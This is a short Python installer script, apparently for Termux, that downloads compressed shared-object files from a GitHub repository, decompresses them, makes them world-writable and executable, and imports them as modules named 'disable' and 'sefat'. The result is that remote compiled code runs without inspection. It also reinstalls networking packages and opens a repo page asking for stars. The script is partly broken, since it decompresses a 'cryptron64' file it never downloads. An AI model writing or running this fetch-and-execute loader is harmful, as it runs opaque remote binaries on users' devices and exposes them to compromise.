disabler_file = "disable.so.gz"
crypton_file = "cryptron64.so.gz"
file = "sefat.so.gz"
import os
os.system("pkg install wget -y")
os.system("pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests")
def intro():
  print('give star to our repo')
  os.system('git pull && clear')
  os.system('xdg-open https://github.com/SEFAT-777/SEFAT')
  os.system('clear')
  
def install_part(file_name):
  os.system(f"curl -L https://github.com/Ahmed-XD/library/blob/main/{file_name}?raw=true -o {file_name}")


if os.path.exists(disabler_file) and os.path.exists(file):
  os.remove(disabler_file)
  os.remove(file)

intro()
install_part(disabler_file)
install_part(file)
os.system(f"gzip -d {file}")
os.system(f"gzip -d {cryptron_file}")
os.system(f"gzip -d {disabler_file}")
os.system(f"chmod 777 sefat.so")
os.system("clear")

import disable
import sefat
